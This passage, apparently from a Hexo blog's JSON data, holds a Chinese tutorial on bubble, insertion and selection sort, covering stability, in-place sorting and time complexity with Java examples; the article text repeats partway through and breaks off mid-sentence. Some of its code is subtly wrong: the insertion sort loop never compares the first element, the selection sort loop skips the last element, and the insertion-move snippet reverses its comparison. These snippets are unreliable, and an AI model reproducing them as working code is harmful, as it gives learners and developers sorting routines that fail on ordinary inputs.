class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在结合上面分析算法的三个方面，有三个问题要问你。</p>\n<p><strong>第一、冒泡排序是原地排序算法吗？</strong></p>\n<p>冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。</p>\n<p><strong>第二、冒泡排序是稳定的排序算法吗？</strong></p>\n<p>在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。</p>\n<p><strong>第三、冒泡排序的时间复杂度是多少？</strong></p>\n<p>最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。</p>\n<p>最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。</p>\n<p>对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过<strong>有序度</strong>和<strong>逆序度</strong>这两个概念来分析。</p>\n<p>有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] &lt;= a[j], 如果i &lt; j$。</p>\n<p>2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)</p>\n<p>同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做<strong>满有序度</strong>。</p>\n<p>逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] &gt; a[j], 如果i &lt; j$。</p>\n<p>关于这三个概念，我们可以得到一个公式：<strong>逆序度 = 满有序度 - 有序度</strong>。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。</p>\n<p>我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15.</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>有序度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>4，5，6，3，2，1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>4，5，3，2，1，6</td>\n<td>6</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>4，3，2，1，5，6</td>\n<td>9</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>3，2，1，4，5，6</td>\n<td>12</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>2，1，3，4，5，6</td>\n<td>14</td>\n</tr>\n<tr>\n<td>第五次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>15</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序包含两个原子操作，<strong>比较</strong>和<strong>交换</strong>。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为<strong>逆序度，也就是n*(n-1)/2 - 初始有序度</strong>。此例中就是15-3=12，也就是要进行12次交换操作。</p>\n<p>对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。</p>\n<p>换句话说，平均情况下需要n*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。</p>\n<p>这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h3></div><br></div>\n\n<p>我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。</p>\n<p>这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。</p>\n<p>那插入排序是如何借助上面的思想来实现排序的呢？</p>\n<p>首先，我们将数组中的数据分为两个区间，<strong>已排序区间</strong>和<strong>未排序区间</strong>。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。</p>\n<p>如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序过程.jpg\">\n<p>插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。</p>\n<p>对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。</p>\n<p>为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/插入排序移动次数.jpg\">\n<p>插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">insertSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n&lt;=<span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;n;i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> val = a[i];</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> j=i-<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(;j&gt;<span class=\"number\">0</span>;j--)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a[j]&gt;val)&#123;</span><br><span class=\"line\">\t\t\t\ta[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ta[j+<span class=\"number\">1</span>] = val;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在同样有三个问题。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。</p>\n<p><strong>第二、插入排序是稳定的排序算法吗？</strong></p>\n<p>在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。</p>\n<p><strong>第三、插入排序的时间复杂度是多少？</strong></p>\n<p>如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是<strong>从尾到头遍历已经有序的数据</strong>。</p>\n<p>如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。</p>\n<p>还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h3></div><br></div>\n\n<p>选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/选择排序过程.jpg\">\n<p>同样，也有三个问题需要你思考。</p>\n<p><strong>第一、插入排序是原地排序算法吗？</strong></p>\n<p>首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。</p>\n<p><strong>第二、插入排序的时间复杂度是多少？</strong></p>\n<p>选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。</p>\n<p><strong>第三、插入排序是稳定的排序算法吗？</strong></p>\n<p>答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。</p>\n<p>比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">selectSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i+<span class=\"number\">1</span>; j&lt;n-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        \t<span class=\"keyword\">if</span>(a[j]&lt;a[i])&#123;</span><br><span class=\"line\">        \t\t<span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">        \t\ta[j] = a[i];</span><br><span class=\"line\">        \t\ta[i] = temp;</span><br><span class=\"line\">        \t&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？</p>\n<p>我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。</p>\n<p>但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序中的数据交换操作</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">    a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">    flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 插入排序中数据移动操作</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(a[j]&lt;val)&#123;</span><br><span class=\"line\">    a[j+<span class=\"number\">1</span>] = a[j];</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。</p>\n<p>所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。</p>\n<table>\n<thead>\n<tr>\n<th>排序算法</th>\n<th>是否原地排序</th>\n<th>是否稳定</th>\n<th>最好</th>\n<th>最坏</th>\n<th>平均</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>冒泡排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>插入排序</td>\n<td>√</td>\n<td>√</td>\n<td>$O(n)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n<tr>\n<td>选择排序</td>\n<td>√</td>\n<td>×</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n<td>$O(n^2)$</td>\n</tr>\n</tbody>\n</table>\n<p>这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。</p>\n<p>今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n*logn)$的排序算法。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。</p>\n<p>排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>排序算法</th>\n<th>时间复杂度</th>\n<th>是否基于比较</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>上</td>\n<td>冒泡、插入、选择</td>\n<td>$ O(n^2) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>中</td>\n<td>快排、归并</td>\n<td>$ O(nlogN) $</td>\n<td>√</td>\n</tr>\n<tr>\n<td>下</td>\n<td>桶、计数、基数</td>\n<td>$ O(n) $</td>\n<td>×</td>\n</tr>\n</tbody>\n</table>\n<p>带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：<font color=\"red\"><strong>插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？</strong></font></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何分析一个排序算法\"><a href=\"#如何分析一个排序算法\" class=\"headerlink\" title=\"如何分析一个排序算法\"></a>如何分析一个排序算法</h3></div><br></div>\n\n<p>学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。<strong>那么要分析一个排序算法，要从哪几方面入手呢？</strong></p>\n<h4 id=\"一、-算法的执行效率\"><a href=\"#一、-算法的执行效率\" class=\"headerlink\" title=\"一、 算法的执行效率\"></a>一、 算法的执行效率</h4><p>对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量：</p>\n<p><strong>1、最好情况、最坏情况、平均情况时间复杂度</strong></p>\n<p>我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。</p>\n<p>为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。</p>\n<p><strong>2、时间复杂度的系数、常数、低阶</strong></p>\n<p>我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。</p>\n<p><strong>3、比较次数和交换次数</strong></p>\n<p>这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。</p>\n<h4 id=\"二、-算法的内存消耗\"><a href=\"#二、-算法的内存消耗\" class=\"headerlink\" title=\"二、 算法的内存消耗\"></a>二、 算法的内存消耗</h4><p>前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，<strong>原地排序</strong>。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。</p>\n<h4 id=\"三、-排序算法的稳定性\"><a href=\"#三、-排序算法的稳定性\" class=\"headerlink\" title=\"三、 排序算法的稳定性\"></a>三、 排序算法的稳定性</h4><p>仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，<strong>稳定性</strong>。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。</p>\n<p>我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。</p>\n<p>这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做<strong>稳定的排序算法</strong>；如果前后顺序发生变化，那对应的排序算法就叫做<strong>不稳定的排序算法</strong>。</p>\n<p>你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？</p>\n<p>很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。</p>\n<p>比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？</p>\n<p>最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。</p>\n<p>但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？</p>\n<p><strong>稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变</strong>。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h3></div><br></div>\n\n<p>我们从冒泡排序开始，学习今天的三种排序算法。</p>\n<p>冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。</p>\n<p>我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样：</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序第一次过程.png\">\n<p>可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。</p>\n<img src=\"/posts/2018-09-20-算法-排序(上)/冒泡排序过程.jpg\">\n<p>实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。</p>\n<table>\n<thead>\n<tr>\n<th>冒泡次数</th>\n<th>冒泡结果</th>\n<th>是否有数据交换</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>初始状态</td>\n<td>3，5，4，1，2，6</td>\n<td>-</td>\n</tr>\n<tr>\n<td>第一次冒泡</td>\n<td>3，4，1，2，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第二次冒泡</td>\n<td>3，1，2，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第三次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>有</td>\n</tr>\n<tr>\n<td>第四次冒泡</td>\n<td>1，2，3，4，5，6</td>\n<td>无，结束排序操作</td>\n</tr>\n</tbody>\n</table>\n<p>冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 冒泡排序 a表示需要排序的数组 n表示数组的大小</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a,<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;n-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> flag = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;n-<span class=\"number\">1</span>-i;j++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[j]&gt;a[j+<span class=\"number\">1</span>])&#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> temp = a[j];</span><br><span class=\"line\">                a[j] = a[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">                a[j+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">                flag = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!flag) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在结合上面分析算法的三个方面，有三个问题要问你。</p>\n<p><strong>第一、冒泡排序是原地排序算法吗？</strong></p>\n<p>冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。</p>\n<p><strong>第二、冒泡排序是稳定的排序算法吗？</strong></p>\n<p>在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。</p>\n<p><strong>第三、冒泡排序的时间复杂度是多少？</strong></p>\n<p>最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。</p>\n<p>最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。</p>\n<p>对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过<strong>有序度</strong>和<strong>逆序度</strong>这两个概念来分析。</p>\n<p>有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] &lt;= a[j], 如果i &lt; j$。</p>\n<p>2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6)</p>\n<p>同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做<strong>满有序度</strong>。</p>\n<p>逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] &gt; a[j], 如果i &lt; j$。</p>\n<p>关于这三个概念，我们可以得到一个公式：<strong>逆序度 = 满有序度 - 